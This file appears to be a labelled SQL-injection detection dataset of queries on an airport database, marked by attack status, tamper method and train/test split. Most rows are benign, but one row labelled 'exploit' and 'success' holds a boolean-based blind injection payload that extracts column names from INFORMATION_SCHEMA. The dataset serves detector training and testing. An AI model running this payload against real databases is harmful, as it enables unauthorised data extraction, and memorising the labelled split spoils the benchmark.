full_query,label,user_inputs,attack_stage,tamper_method,attack_status,statement_type,query_template_id,attack_id,attack_technique,split
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 150.0 AND 2086.0",0,150.0 2086.0,,,,select,airport-S2,,,train
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""4835"" AS SIGNED) AND a.iso_country = ""IL"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,4835 IL,,,,select,airport-S22,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Kamloops;""",0,Kamloops,,,,select,airport-S21,,,test
SELECT * FROM airport WHERE icao_code = 'LFCC';,0,LFCC,,,,select,airport-S1,,,test
"SELECT * FROM airport WHERE gps_code = ""72AZ"" OR local_code = ""WY50""",0,72AZ WY50,,,,select,airport-S4,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Bilasuvar District"";",0,Bilasuvar District,,,,select,airport-S15,,,train
"UPDATE countries SET keywords = ""Airports in San Marino"" WHERE code = ""NG"";",0,Airports in San Marino NG,,,,update,airport-U8,,,test
"INSERT INTO regions (code, local_code, name, continent, iso_country) VALUES (""GM-L"", ""05"", ""Bolama Region"", ""EU"", ""BS"")",0,GM-L 05 Bolama Region EU BS,,,,insert,airport-I5,,,test
"UPDATE regions SET keywords = ""Airports in Kyrenia District"" WHERE iso_country = ""TW"";",0,Airports in Kyrenia District TW,,,,update,airport-U9,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""AF"" GROUP BY r.name ORDER BY r.name ASC;",0,AF,,,,select,airport-S5,,,train
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""GR-C""",0,AS GR-C,,,,select,airport-S8,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""US-1000"", ""closed"", ""AZ Landing Strip"", 68.832916, -87.991699)",0,US-1000 closed AZ Landing Strip 68.832916 -87.991699,,,,insert,airport-I1,,,test
"DELETE FROM airport WHERE name LIKE ""Les Sangliers Heliport"" OR keywords LIKE ""New Jersey Steel Helistop"";  ",0,Les Sangliers Heliport New Jersey Steel Helistop,,,,delete,airport-D3,,,train
"SELECT id FROM airports WHERE scheduled_service = ""no"" AND elevation_feet BETWEEN 4098.0 AND 3937.0 AND longitude >= -86.52698 AND latitude <= 31.147939",0,no 4098.0 3937.0 -86.52698 31.147939,,,,select,airport-S23,,,train
"INSERT INTO countries (code, name, continent, keywords) VALUES (""SD"" LIKE ""SD"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x636f756e7472696573 AND table_schema LIKE 0x64617461736574 LIMIT 5,1),8,1))>112,2888) AND ""SD"" LIKE ""SD"", ""Tanzania"", ""EU"", ""Airports in Sint Maarten"")",1," SD"" LIKE ""SD"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x636f756e7472696573 AND table_schema LIKE 0x64617461736574 LIMIT 5,1),8,1))>112,2888) AND ""SD"" LIKE ""SD Tanzania EU Airports in Sint Maarten ",exploit,equaltolike,success,insert,airport-I6,boolean-30,boolean,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""IN-0349"";",0,IN-0349,,,,select,airport-S7,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Usina União Industria Private Airport"");",0,Usina União Industria Private Airport,,,,select,airport-S12,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (74683, 5311, ""NZCH"", ""MISC"", ""MISC"", 655.9)",0,74683 5311 NZCH MISC MISC 655.9,,,,insert,airport-I8,,,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""US-5422"",""closed"", ""Campo Veintisiete Airstrip"",""https://en.wikipedia.org/wiki/Nelson_Airport_(British_Columbia)"",""OC"")",0,US-5422 closed Campo Veintisiete Airstrip https://en.wikipedia.org/wiki/Nelson_Airport_(British_Columbia) OC,,,,insert,airport-I3,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""BY"" GROUP BY r.name ORDER BY r.name ASC;",0,BY,,,,select,airport-S5,,,test
"UPDATE airport SET wikipedia_link = ""https://en.wikipedia.org/wiki/Myrtle_Creek_Municipal_Airport"" WHERE ident = ""US-5803""",0,https://en.wikipedia.org/wiki/Myrtle_Creek_Municipal_Airport US-5803,,,,update,airport-U3,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Shiramentza;""",0,Shiramentza,,,,select,airport-S21,,,test
"DELETE FROM airport_frequencies WHERE type = ""ATF"";",0,ATF,,,,delete,airport-D4,,,test
"UPDATE countries SET keywords = ""Lentokentät, Suomen"" WHERE code = ""SB"";",0,"Lentokentät, Suomen SB",,,,update,airport-U8,,,train
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (13995, ""KCAG"", 2623.0, ""CONC"", 1, 0)",0,13995 KCAG 2623.0 CONC 1 0,,,,insert,airport-I9,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""US-1392"";",0,US-1392,,,,select,airport-S7,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""RIO"") OR name LIKE ""Agriflite Services""",0,RIO Agriflite Services,,,,select,airport-S10,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""03I"") OR name LIKE ""06R""",0,03I 06R,,,,select,airport-S10,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""Rosiclare, Stone RLA"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""LSXW"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""German Diagnostic Clinic (DKD)"", ""%"");",0,"Rosiclare, Stone RLA LSXW German Diagnostic Clinic (DKD)",,,,select,airport-S17,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""4TS8"", ""small_airport"", ""Shoab 1 Platform Heliport"", -8.85837, 20.635156631469727, 2391.0)",0,4TS8 small_airport Shoab 1 Platform Heliport -8.85837 20.635156631469727 2391.0,,,,insert,airport-I2,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""SSCM"", ""small_airport"", ""Antelope Ranch Airport"", 28.618687, -109.45949, 272.0)",0,SSCM small_airport Antelope Ranch Airport 28.618687 -109.45949 272.0,,,,insert,airport-I2,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""TR"" GROUP BY r.name ORDER BY r.name ASC;",0,TR,,,,select,airport-S5,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""KLVN"";",0,KLVN,,,,select,airport-S7,,,train
